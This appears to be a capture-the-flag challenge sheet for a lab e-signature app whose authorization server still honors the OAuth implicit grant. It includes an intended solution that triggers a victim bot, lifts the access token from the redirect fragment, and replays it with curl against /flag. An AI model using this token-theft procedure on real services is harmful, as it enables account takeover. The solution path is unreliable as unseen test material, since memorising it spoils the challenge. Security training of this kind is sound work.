# oauth/implicit-grant-abuse — ImplicitGrantAbuse (identity-gated, high)

**QuickSign** e-signature app + mini-AS ("SignID") with a legacy **mobile webview** sign-in.
**Bug:** the AS still honors the implicit grant (`response_type=token`) — the access token is returned in the **URL fragment** of the webview callback, where page scripts (and any observer of the URL) can capture it.

## Intended path
1. Drive the victim through the legacy flow: `POST http://collector.target.lab:8119/victim` with `{"url":"http://victim.target.lab:8119/login?flow=token","sso":true}` — the bot (innocent AS session) follows `/login?flow=token → /oauth/authorize?response_type=token → 302 /oauth/implicit/callback#access_token=…`.
2. The redirect `Location` (and the bot's `finalUrl` / last hop) **includes the `#fragment`** — read the `access_token` (and `sub`) from it. The webview page itself also displays `location.hash` via JavaScript.
3. `curl -H "Authorization: Bearer <token>" http://victim.target.lab:8119/flag` — gate: token `sub` must be the innocent identity (server-side verification).

**Flag:** `DSLTV{OAUTH-ImplicitGrantAbuse-<9 digits>}` (only from `/flag`).
